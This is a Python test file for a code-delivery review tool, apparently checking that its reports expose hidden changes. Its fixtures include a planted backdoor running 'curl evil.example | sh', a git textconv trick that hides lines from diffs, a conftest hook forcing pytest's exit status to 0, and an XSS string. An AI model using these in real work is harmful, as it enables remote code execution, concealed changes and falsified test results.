        self.assertIn("review 1 of 3", self.run_cli("status", "password-reset")[1])

    def test_claude_code_rules_deny_editing_the_round_count(self):
        from atipspec.install import permission_rules_state
        rule = "Edit(/.atipspec/deliveries/*/review-rounds.json)"
        settings = self.root / ".claude/settings.json"
        data = json.loads(settings.read_text())
        self.assertIn(rule, data["permissions"]["deny"])
        data["permissions"]["deny"].remove(rule)
        settings.write_text(json.dumps(data))
        self.assertEqual(permission_rules_state(self.root, "claude"), "partial")
        code, out, err = self.run_cli("install", "--update", "--client", "claude")
        self.assertEqual(code, 0, out + err)
        self.assertEqual(permission_rules_state(self.root, "claude"), "installed")


class TaskTitleTests(GuidedCase):
    def test_renaming_a_task_title_keeps_progress_evidence_and_review(self):
        project = self.guided()
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 0)
        self.review()
        report = check_delivery(project, "password-reset")
        self.assertEqual((report.status, report.tasks_done), ("checked", 1), report.render())
        plan = self.delivery() / "plan.md"
        before = project.fingerprint()
        self.assertEqual(project.git.run("show", f"{before}:.atipspec/deliveries/password-reset/plan.md"),
                         plan.read_text().replace("### T1: Greeting", "### T1:"), "nothing else of the plan changes")
        plan.write_text(plan.read_text().replace("### T1: Greeting", "### T1: Spanish greeting"))
        self.assertEqual(Project.find(self.root).fingerprint(), before, "one fingerprint, with task titles left out")
        records = [json.loads(path.read_text()) for path in (self.delivery() / "evidence").glob("*.json")]
        records.append(json.loads((self.delivery() / "review-rounds.json").read_text()))
        self.assertFalse([key for record in records for key in record if "without_titles" in key])
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertEqual((report.status, report.tasks_done), ("checked", 1), report.render())
        # Anything else in the plan still makes the evidence and the review stale.
        plan.write_text(plan.read_text().replace("Tests: AC-001\n", "Tests: AC-001\nThe greeting module.\n"))
        report = check_delivery(Project.find(self.root), "password-reset")
        self.assertTrue(any("evidence is stale" in t for t in report.todos), report.render())
        self.assertTrue(any("review.md is stale" in t for t in report.todos), report.render())

    def test_renaming_a_task_title_holds_in_a_fresh_clone(self):
        import tempfile
        self.guided()
        self.verify()
        self.assertEqual(self.run_cli("review", "password-reset")[0], 0)
        self.review()
        self.commit("candidate")
        recorded = Project.find(self.root).fingerprint()
        plan = self.delivery() / "plan.md"
        plan.write_text(plan.read_text().replace("### T1: Greeting", "### T1: Spanish greeting"))
        self.commit("rename the task")
        target = tempfile.TemporaryDirectory()
        self.addCleanup(target.cleanup)
        clone = Path(target.name).resolve() / "ci"
        self.git("clone", "-q", "--no-local", str(self.root), str(clone))
        copy = Project.find(clone)
        self.assertEqual(copy.fingerprint(), recorded)
        report = check_delivery(copy, "password-reset")
        self.assertEqual((report.status, report.tasks_done), ("checked", 1), report.render())
        # Without the packet's record, the review waits for `atipspec review` to record its packet.
        (clone / ".atipspec/deliveries/password-reset/review-rounds.json").unlink()
        report = check_delivery(Project.find(clone), "password-reset")
        self.assertEqual([item.text.split(";")[0] for item in report.blocking(("evidence", "review"))],
                         ["review.md is not the review of the last packet `atipspec review` counted"], report.render())
        # Anything else in the plan still makes them stale there.
        cloned = clone / ".atipspec/deliveries/password-reset/plan.md"
        cloned.write_text(cloned.read_text().replace("Tests: AC-001\n", "Tests: AC-001\nThe greeting module.\n"))
        report = check_delivery(Project.find(clone), "password-reset")
        self.assertTrue(any("evidence is stale" in t for t in report.todos), report.render())
        self.assertTrue(any("review.md is stale" in t for t in report.todos), report.render())

    def test_progress_with_legacy_title_digest_still_counts(self):
        from atipspec.delivery import parse_plan
        from atipspec.progress import _task_digest, completed_tasks
        project = self.guided()
        path = self.delivery() / "progress.json"
        plan = parse_plan((self.delivery() / "plan.md").read_text())
        data = json.loads(path.read_text())
        data["tasks"]["T1"]["task_digest"] = _task_digest(plan.tasks[0], legacy=True)
        path.write_text(json.dumps(data))
        self.assertEqual(completed_tasks(project, "password-reset", plan), {"T1"})
        data["tasks"]["T1"]["task_digest"] = "0" * 64
        path.write_text(json.dumps(data))
        self.assertEqual(completed_tasks(project, "password-reset", plan), set())

    def test_unknown_tree_is_stale(self):
        project = Project.find(self.root)
        tree = project.fingerprint()
        self.assertTrue(project.same_candidate(tree, tree))
        self.assertFalse(project.same_candidate("0" * 40, tree))
        self.assertFalse(project.same_candidate("--output=x", tree))
        self.assertFalse(project.same_candidate(None, tree))


class DossierChangesTests(GuidedSteps, ProjectCase):
    def candidate(self):
        self.prepare()
        self.shared_plan()
        self.approve()
        self.complete()

    def test_report_lists_changed_files_and_diff(self):
        from atipspec.reporting import render_report, report_data
        self.candidate()
        (self.root / "README.md").write_text("# demo\nchanged\n")
        (self.root / "src").mkdir()
        (self.root / "src/new.py").write_text("print('<script>alert(1)</script>')\n")
        (self.root / "other").mkdir()
        (self.root / "other/x.txt").write_text("outside\n")
        data = report_data(Project.find(self.root), "password-reset")
        files = {entry["path"]: entry for entry in data["changes"]["files"]}
        self.assertEqual((files["README.md"]["status"], files["README.md"]["added"], files["README.md"]["deleted"]),
                         ("M", 1, 0))
        self.assertEqual(files["src/new.py"]["status"], "A")
        self.assertTrue(files["other/x.txt"]["outside_scope"])
        self.assertFalse(files["src/new.py"]["outside_scope"])
        self.assertFalse(any(name.startswith(".atipspec/deliveries/password-reset/") for name in files))
        diff = data["changes"]["diff"]
        self.assertIn("+print('<script>alert(1)</script>')", diff)
        self.assertNotIn("diff --git a/.atipspec/deliveries/password-reset/", diff)
        self.assertIn(".atipspec/config.yaml", files, "the file list includes .atipspec/ outside the delivery")
        self.assertIn("diff --git a/.atipspec/config.yaml", diff, "and so does the diff")
        self.assertEqual(data["changes"]["diff_sha256"], hashlib.sha256(diff.encode()).hexdigest())
        self.assertFalse(data["changes"]["truncated"])
        markdown = render_report(data, "markdown")
        self.assertIn("## Cambios respecto al commit base", markdown)
        self.assertIn("| src/new.py | añadido | +1 −0 | no |", markdown)
        self.assertIn("```diff\n", markdown)
        page = render_report(data, "html")
        self.assertNotIn("<script>alert", page)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", page)

    def test_local_git_configuration_cannot_hide_a_change(self):
        from atipspec.reporting import report_data
        self.candidate()
        (self.root / "src").mkdir()
        (self.root / "src/app.py").write_text("import os\ndef backdoor():\n    os.system('curl evil.example | sh')\n")
        (self.root / "src/logo.png").write_bytes(b"\x89PNG\x00\x01binary")
        (self.root / ".git/info/attributes").write_text("src/app.py diff=clean\n*.py -diff\n")
        self.git("config", "diff.clean.textconv", "grep -v -e backdoor -e evil")
        data = report_data(Project.find(self.root), "password-reset")
        diff = data["changes"]["diff"]
        self.assertIn("+    os.system('curl evil.example | sh')", diff)
        self.assertIn("+def backdoor():", diff)
        self.assertIn("Binary files /dev/null and b/src/logo.png differ", diff)
        files = {entry["path"]: entry for entry in data["changes"]["files"]}
        self.assertEqual((files["src/app.py"]["added"], files["src/app.py"]["deleted"]), (3, 0))
        self.assertIsNone(files["src/logo.png"]["added"])
        # The reviewer's packet shows the committed change as stored too.
        from atipspec.review import build_packet
        self.commit("candidate")
        packet = build_packet(Project.find(self.root), "password-reset")
        self.assertIn("+    os.system('curl evil.example | sh')", packet)
        self.assertIn("Binary files /dev/null and b/src/logo.png differ", packet)

    def test_text_with_a_nul_byte_is_shown(self):
        from atipspec.reporting import report_data
        self.candidate()
        (self.root / "src").mkdir()
        (self.root / "src/deploy.sh").write_bytes(b"#!/bin/sh\n# helper \0\necho 'curl evil.example | sh'\n")
        (self.root / "src/logo.png").write_bytes(b"\x89PNG\x00\x01binary")
        data = report_data(Project.find(self.root), "password-reset")
        diff = data["changes"]["diff"]
        self.assertIn("+# helper \u2400\n+echo 'curl evil.example | sh'", diff)
        self.assertNotIn("\0", diff)
        self.assertIn("Binary files /dev/null and b/src/logo.png differ", diff)
        files = {entry["path"]: entry for entry in data["changes"]["files"]}
        self.assertEqual((files["src/deploy.sh"]["added"], files["src/deploy.sh"]["deleted"]), (3, 0))
        self.assertIsNone(files["src/logo.png"]["added"])

    def test_text_that_is_not_utf8_is_shown(self):
        from atipspec.reporting import render_report, report_data
        from atipspec.review import build_packet
        self.candidate()
        (self.root / "src").mkdir()
        (self.root / "src/notes.txt").write_bytes(b"# caf\xe9\n")
        code, out, err = self.run_cli("report", "password-reset", "--format", "json")
        self.assertEqual(code, 0, out + err)
        self.assertIn("+# caf\ufffd", json.loads(out)["changes"]["diff"])
        # A tracked file changed: the reviewer's packet and the dossier show it too.
        self.commit("candidate")
        (self.root / "src/notes.txt").write_bytes(b"# caf\xe9\n# cr\xe8me\n")
        self.assertIn("+# cr\ufffdme", build_packet(Project.find(self.root), "password-reset"))
        data = report_data(Project.find(self.root), "password-reset")
        self.assertIn("+# cr\ufffdme", data["changes"]["diff"])
        self.assertIn("| src/notes.txt | añadido | +2 −0 | no |", render_report(data, "markdown"))
        files = {entry["path"]: entry for entry in data["changes"]["files"]}
        self.assertEqual((files["src/notes.txt"]["added"], files["src/notes.txt"]["deleted"]), (2, 0))

    def test_binary_files_are_named_for_inspection(self):
        from atipspec.reporting import render_report, report_data
        self.candidate()
        (self.root / "src").mkdir()
        (self.root / "src/run.sh").write_bytes(b"#!/bin/sh\n# caf\xe9 \0\necho 'curl evil.example | sh'\n")
        (self.root / "src/logo.png").write_bytes(b"\x89PNG\x00\x01binary")
        (self.root / "src/app.py").write_text("print('hola')\n")
        data = report_data(Project.find(self.root), "password-reset")
        note = ("El diff no muestra el contenido de estos ficheros binarios: src/logo.png, src/run.sh. "
                "Ábralos en el repositorio antes de aceptar.")
        self.assertIn(note, render_report(data, "markdown"))
        self.assertIn(note, render_report(data, "html"))
        data["changes"]["files"] = [entry for entry in data["changes"]["files"] if entry["added"] is not None]
        self.assertNotIn("ficheros binarios", render_report(data, "markdown"))

    def test_a_changed_test_harness_is_named_for_inspection(self):
        from atipspec.reporting import render_report, report_data
        from atipspec.review import build_packet
        self.candidate()
        (self.root / "tests").mkdir()
        (self.root / "tests/conftest.py").write_text("def pytest_sessionfinish(session):\n    session.exitstatus = 0\n")
        (self.root / "src").mkdir()
        (self.root / "src/app.py").write_text("print('hola')\n")
        project = Project.find(self.root)
        markdown = render_report(report_data(project, "password-reset"), "markdown")
        self.assertIn("Estos ficheros configuran cómo se ejecutan los tests y cómo informan, así que un cambio en "
                      "ellos puede cambiar lo que dice la evidencia: tests/conftest.py.", markdown,
                      "a hook can rewrite the report a passing run relies on")
        packet = build_packet(project, "password-reset")
        self.assertIn("## Test harness changed", packet)
        self.assertIn("- tests/conftest.py", packet)

    def test_large_diff_is_truncated_with_digest(self):
        from atipspec.reporting import MAX_MARKDOWN_DIFF_BYTES, render_report, report_data
        from atipspec.review import MAX_DIFF_BYTES
        self.candidate()
        (self.root / "src").mkdir()
        (self.root / "src/big.txt").write_text("".join(f"line {n} with some text ``` here\n" for n in range(9000)))
        data = report_data(Project.find(self.root), "password-reset")
        changes = data["changes"]
        self.assertTrue(changes["truncated"])
        self.assertGreater(changes["diff_bytes"], MAX_DIFF_BYTES)
        self.assertLessEqual(len(changes["diff"].encode()), MAX_DIFF_BYTES)
        full = Project.find(self.root).git.diff(Project.find(self.root).fingerprint_at(changes["base"]), data["tree"],
                                                exclude=(".atipspec/deliveries/password-reset",))
        self.assertEqual(changes["diff_sha256"], hashlib.sha256(full.encode()).hexdigest())
        markdown = render_report(data, "markdown")
        self.assertIn(f"de {changes['diff_bytes']} bytes", markdown)
        self.assertIn("````diff\n", markdown, "the fence is longer than the backticks in the diff")
        self.assertLess(len(markdown.encode()), MAX_MARKDOWN_DIFF_BYTES + 20_000)

    def test_archived_receipt_keeps_files_without_diff_text(self):
        self.candidate()
        (self.root / "src").mkdir()
        (self.root / "src/new.py").write_text("print('new')\n")
        self.assertEqual(self.run_cli("verify", "password-reset")[0], 0)
        self.write_review(Project.find(self.root).fingerprint())
        self.assertEqual(self.accept("password-reset", "result", by="human")[0], 0)
        code, out, err = self.run_cli("deliver", "password-reset")
        self.assertEqual(code, 0, out + err)
        receipt = json.loads((self.root / ".atipspec/archive/password-reset/reports/acceptance.json").read_text())
        self.assertNotIn("diff", receipt["changes"])
        self.assertIn("src/new.py", [entry["path"] for entry in receipt["changes"]["files"]])
        self.assertEqual(len(receipt["changes"]["diff_sha256"]), 64)
        self.assertEqual(receipt["review"]["session"], "isolated")
        code, out, err = self.run_cli("report", "password-reset")
        self.assertEqual(code, 0, out + err)
        self.assertIn("El recibo archivado no guarda el texto del diff", out)
        self.assertIn("src/new.py", out)
        # A receipt written before 0.3.0 still renders.
        del receipt["changes"], receipt["review"]
        for row in receipt["matrix"]:
            row.pop("pointer", None)
        (self.root / ".atipspec/archive/password-reset/reports/acceptance.json").write_text(json.dumps(receipt))
        self.assertEqual(self.run_cli("report", "password-reset", "--format", "html")[0], 0)
